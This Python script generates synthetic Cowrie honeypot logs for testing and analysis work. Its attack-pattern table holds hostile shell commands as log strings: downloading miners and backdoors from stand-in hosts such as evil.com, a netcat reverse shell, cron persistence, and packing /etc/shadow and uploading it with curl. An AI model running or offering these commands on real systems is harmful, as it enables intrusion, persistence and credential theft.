#!/usr/bin/env python3
"""
Generate synthetic Cowrie honeypot logs for testing.

Usage:
    python scripts/generate_sample_data.py --output data/raw/cowrie.json --sessions 1000
"""

import argparse
import json
import random
from datetime import datetime, timedelta
from pathlib import Path


# Realistic attack patterns
ATTACK_PATTERNS = {
    "crypto_miner": [
        "wget http://pool.minexmr.com/miner.sh",
        "chmod +x miner.sh",
        "./miner.sh",
        "crontab -l",
        "echo '* * * * * /tmp/miner.sh' | crontab -",
        "exit"
    ],
    "reconnaissance": [
        "ls",
        "pwd",
        "whoami",
        "uname -a",
        "cat /proc/version",
        "ps aux",
        "netstat -an",
        "ifconfig",
        "exit"
    ],
    "persistence": [
        "wget http://evil.com/backdoor.py",
        "python backdoor.py",
        "echo 'python /tmp/backdoor.py' >> /etc/rc.local",
        "systemctl enable backdoor",
        "crontab -e",
        "exit"
    ],
    "lateral_movement": [
        "nmap -sS 192.168.1.0/24",
        "ssh user@192.168.1.10",
        "scp /tmp/payload user@192.168.1.10:/tmp/",
        "nc -e /bin/sh 192.168.1.10 4444",
        "exit"
    ],
    "data_exfiltration": [
        "tar -czf /tmp/data.tar.gz /etc/passwd /etc/shadow",
        "base64 /tmp/data.tar.gz > /tmp/data.b64",
        "curl -F 'file=@/tmp/data.b64' http://evil.com/upload",
        "rm -rf /tmp/data.tar.gz /tmp/data.b64",
        "exit"
    ],
    "mirai_variant": [
        "wget http://botnet.com/mirai.x86",
        "chmod 777 mirai.x86",
        "./mirai.x86",
        "rm -f mirai.x86",
        "exit"
    ],
}

# IP ranges for different "countries"
IP_RANGES = {
    "US": [("45.0.0.0", "45.255.255.255"), ("52.0.0.0", "52.255.255.255")],
    "CN": [("14.0.0.0", "14.255.255.255"), ("36.0.0.0", "36.255.255.255")],
    "RU": [("5.0.0.0", "5.255.255.255"), ("31.0.0.0", "31.255.255.255")],
    "BR": [("177.0.0.0", "177.255.255.255"), ("179.0.0.0", "179.255.255.255")],
    "DE": [("78.0.0.0", "78.255.255.255"), ("88.0.0.0", "88.255.255.255")],
    "IN": [("59.0.0.0", "59.255.255.255"), ("117.0.0.0", "117.255.255.255")],
}


def ip_to_int(ip: str) -> int:
    """Convert IP string to integer."""
    parts = [int(p) for p in ip.split(".")]
    return (parts[0] << 24) + (parts[1] << 16) + (parts[2] << 8) + parts[3]


def int_to_ip(i: int) -> str:
    """Convert integer to IP string."""
    return f"{(i >> 24) & 0xFF}.{(i >> 16) & 0xFF}.{(i >> 8) & 0xFF}.{i & 0xFF}"


def random_ip(country: str = None) -> str:
    """Generate random IP from country ranges."""
    if country and country in IP_RANGES:
        range_start, range_end = random.choice(IP_RANGES[country])
        start = ip_to_int(range_start)
        end = ip_to_int(range_end)
        return int_to_ip(random.randint(start, end))

    # Random IP
    return f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"


def generate_session(session_id: int, pattern_name: str = None, 
                    base_time: datetime = None) -> list:
    """Generate a single attack session."""
    if pattern_name is None:
        pattern_name = random.choice(list(ATTACK_PATTERNS.keys()))

    if base_time is None:
        base_time = datetime(2025, 1, 1) + timedelta(days=random.randint(0, 90))

    commands = ATTACK_PATTERNS[pattern_name]
    session = f"sess_{session_id:06d}"
    src_ip = random_ip()

    events = []
    current_time = base_time

    for cmd in commands:
        # Add random delay between commands (0.5s to 10s)
        delay = random.uniform(0.5, 10.0)
        current_time += timedelta(seconds=delay)

        event = {
            "eventid": "cowrie.command.input",
            "timestamp": current_time.strftime("%Y-%m-%dT%H:%M:%S.%fZ"),
            "session": session,
            "src_ip": src_ip,
            "input": cmd,
            "duration": round(random.uniform(0.01, 2.0), 3)
        }
        events.append(event)

    return events


def generate_dataset(num_sessions: int, output_path: str, 
                    pattern_distribution: dict = None):
    """Generate synthetic honeypot dataset."""
    output = Path(output_path)
    output.parent.mkdir(parents=True, exist_ok=True)

    if pattern_distribution is None:
        # Default distribution
        pattern_distribution = {
            "crypto_miner": 0.25,
            "reconnaissance": 0.20,
            "persistence": 0.15,
            "lateral_movement": 0.15,
            "data_exfiltration": 0.10,
            "mirai_variant": 0.15,
        }

    patterns = list(pattern_distribution.keys())
    weights = list(pattern_distribution.values())

    all_events = []
    base_time = datetime(2025, 1, 1)

    print(f"Generating {num_sessions} sessions...")

    for i in range(num_sessions):
        pattern = random.choices(patterns, weights=weights)[0]

        # Some patterns repeat (botnet behavior)
        if random.random() < 0.3:  # 30% chance of repeated pattern
            pattern = random.choice(["crypto_miner", "mirai_variant"])

        session_time = base_time + timedelta(
            days=random.randint(0, 90),
            hours=random.randint(0, 23),
            minutes=random.randint(0, 59)
        )

        events = generate_session(i, pattern, session_time)
        all_events.extend(events)

        if (i + 1) % 100 == 0:
            print(f"  Generated {i + 1}/{num_sessions} sessions")

    # Write to file
    with open(output, 'w') as f:
        for event in all_events:
            f.write(json.dumps(event) + '\n')

    print(f"\nDataset generated: {output}")
    print(f"Total events: {len(all_events)}")
    print(f"Total sessions: {num_sessions}")
    print(f"Average events per session: {len(all_events) / num_sessions:.1f}")


def main():
    parser = argparse.ArgumentParser(description="Generate synthetic Cowrie honeypot logs")
    parser.add_argument("--output", default="data/raw/cowrie.json", help="Output file path")
    parser.add_argument("--sessions", type=int, default=1000, help="Number of sessions to generate")
    parser.add_argument("--seed", type=int, default=42, help="Random seed for reproducibility")
    args = parser.parse_args()

    random.seed(args.seed)

    generate_dataset(args.sessions, args.output)
    return 0


if __name__ == "__main__":
    exit(main())
